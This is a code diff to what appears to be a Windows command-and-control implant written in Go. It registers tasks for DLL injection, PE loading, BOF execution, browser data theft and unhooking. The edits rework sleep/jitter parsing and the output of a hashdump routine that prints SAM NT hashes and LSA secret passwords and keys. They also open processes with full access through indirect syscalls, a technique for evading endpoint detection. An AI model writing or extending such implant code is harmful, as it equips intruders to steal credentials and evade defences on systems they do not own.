@@ -49,7 +49,7 @@ func init() {
 	Register(proto.TaskLoadDLL, handleLoadDLL)
 	Register(proto.TaskLoadPE, handleLoadPE)
 	Register(proto.TaskInjectDLL, handleInjectDLL)
-	Register(proto.TaskLSASecrets, handleLSASecrets)
+	Register(proto.TaskLSASecrets, handleHashdump)
 	Register(proto.TaskBOF, handleBOF)
 }
 
@@ -214,19 +214,31 @@ func handleEnv(task *proto.Task) *proto.TaskResult {
 }
 
 func handleSleep(task *proto.Task) *proto.TaskResult {
-	var args SleepArgs
+	var sleepSec uint32 = 5
+	var jitterPct uint8 = 10
 	if len(task.Args) > 0 {
-		if err := json.Unmarshal([]byte(task.Args[0]), &args); err != nil {
-			return fail(task, "invalid sleep args: "+err.Error())
+		if err := json.Unmarshal([]byte(task.Args[0]), &sleepSec); err == nil {
+		} else {
+			var args SleepArgs
+			if err := json.Unmarshal([]byte(task.Args[0]), &args); err == nil {
+				sleepSec = args.Sleep
+				jitterPct = args.Jitter
+			}
+		}
+	}
+	if len(task.Args) > 1 {
+		var j uint8
+		if err := json.Unmarshal([]byte(task.Args[1]), &j); err == nil {
+			jitterPct = j
 		}
 	}
 	if Config.Sleep != nil {
-		*Config.Sleep = args.Sleep
+		*Config.Sleep = sleepSec
 	}
 	if Config.Jitter != nil {
-		*Config.Jitter = args.Jitter
+		*Config.Jitter = jitterPct
 	}
-	return success(task, []byte(fmt.Sprintf("sleep=%ds jitter=%d%%", args.Sleep, args.Jitter)))
+	return success(task, []byte(fmt.Sprintf("sleep=%ds jitter=%d%%", sleepSec, jitterPct)))
 }
 
 func handleExit(task *proto.Task) *proto.TaskResult {
@@ -242,38 +254,38 @@ func handleHashdump(task *proto.Task) *proto.TaskResult {
 	var sb strings.Builder
 
 	if result.ComputerName != "" {
-		sb.WriteString(fmt.Sprintf("Computer: %s\n", result.ComputerName))
+		sb.WriteString(fmt.Sprintf("[+] computer: %s\n", result.ComputerName))
 	}
 	if result.IsDomainJoined {
-		sb.WriteString(fmt.Sprintf("Domain: %s (domain-joined)\n", result.DomainName))
+		sb.WriteString(fmt.Sprintf("[+] domain: %s (domain-joined)\n", result.DomainName))
 	} else {
-		sb.WriteString(fmt.Sprintf("Domain: %s (workgroup)\n", result.DomainName))
+		sb.WriteString(fmt.Sprintf("[+] domain: %s (workgroup)\n", result.DomainName))
 	}
-	sb.WriteString(fmt.Sprintf("BootKey: %x\n\n", result.BootKey))
+	sb.WriteString(fmt.Sprintf("[+] bootkey: %x\n\n", result.BootKey))
 
-	sb.WriteString("=== SAM Credentials ===\n")
+	sb.WriteString("[+] sam credentials\n")
 	for _, cred := range result.Credentials {
-		sb.WriteString(fmt.Sprintf("%s:%d:%s:%s\n", cred.Username, cred.RID, cred.NTHash, cred.Status))
+		sb.WriteString(fmt.Sprintf("    %s:%d:%s:%s\n", cred.Username, cred.RID, cred.NTHash, cred.Status))
 	}
 
 	if len(result.LSASecrets) > 0 {
-		sb.WriteString("\n=== LSA Secrets ===\n")
+		sb.WriteString("\n[+] lsa secrets\n")
 		for _, secret := range result.LSASecrets {
-			sb.WriteString(fmt.Sprintf("[%s] %s\n", secret.Type, secret.Name))
+			sb.WriteString(fmt.Sprintf("    [%s] %s\n", secret.Type, secret.Name))
 			if secret.Password != "" {
-				sb.WriteString(fmt.Sprintf("  Password: %s\n", secret.Password))
+				sb.WriteString(fmt.Sprintf("        password: %s\n", secret.Password))
 			}
 			if len(secret.NTHash) > 0 {
-				sb.WriteString(fmt.Sprintf("  NTHash: %x\n", secret.NTHash))
+				sb.WriteString(fmt.Sprintf("        nthash: %x\n", secret.NTHash))
 			}
 			if len(secret.MachineKey) > 0 {
-				sb.WriteString(fmt.Sprintf("  MachineKey: %x\n", secret.MachineKey))
+				sb.WriteString(fmt.Sprintf("        machinekey: %x\n", secret.MachineKey))
 			}
 			if len(secret.UserKey) > 0 {
-				sb.WriteString(fmt.Sprintf("  UserKey: %x\n", secret.UserKey))
+				sb.WriteString(fmt.Sprintf("        userkey: %x\n", secret.UserKey))
 			}
 			if secret.MatchedUser != "" {
-				sb.WriteString(fmt.Sprintf("  MatchedUser: %s\n", secret.MatchedUser))
+				sb.WriteString(fmt.Sprintf("        matcheduser: %s\n", secret.MatchedUser))
 			}
 		}
 	}
@@ -287,11 +299,6 @@ func handleChrome(task *proto.Task) *proto.TaskResult {
 		return fail(task, err.Error())
 	}
 	return success(task, data)
-}
-
-func handleLSASecrets(task *proto.Task) *proto.TaskResult {
-	// LSA secrets are included in hashdump output - this is a convenience alias
-	return handleHashdump(task)
 }
 
 func handleUnhook(task *proto.Task) *proto.TaskResult {
@@ -462,7 +469,7 @@ func openProcess(pid uint32) (uintptr, error) {
 	oa.Length = uint32(unsafe.Sizeof(oa))
 	cid := clientID{pid: uintptr(pid)}
 
-	access := uintptr(0x001F0FFF) // PROCESS_ALL_ACCESS
+	access := uintptr(0x001F0FFF)
 	ret, _ := wc.IndirectSyscall(openProc.SSN, openProc.Address,
 		uintptr(unsafe.Pointer(&hProcess)),
 		access,
@@ -490,16 +497,16 @@ func findProcess(name string) (uint32, error) {
 	const TH32CS_SNAPPROCESS = 0x00000002
 
 	type processEntry32 struct {
-		dwSize              uint32
-		cntUsage            uint32
-		th32ProcessID       uint32
-		th32DefaultHeapID   uintptr
-		th32ModuleID        uint32
-		cntThreads          uint32
-		th32ParentProcessID uint32
-		pcPriClassBase      int32
-		dwFlags             uint32
-		szExeFile           [260]uint16
+		dwSize			uint32
+		cntUsage		uint32
+		th32ProcessID		uint32
+		th32DefaultHeapID	uintptr
+		th32ModuleID		uint32
+		cntThreads		uint32
+		th32ParentProcessID	uint32
+		pcPriClassBase		int32
+		dwFlags			uint32
+		szExeFile		[260]uint16
 	}
 
 	snap, _, _ := wc.CallG0(createSnapshot, TH32CS_SNAPPROCESS, 0)
@@ -581,5 +588,4 @@ func packBOFArgsFromStrings(args []string) []byte {
 	}
 	return packed
 }
-
 
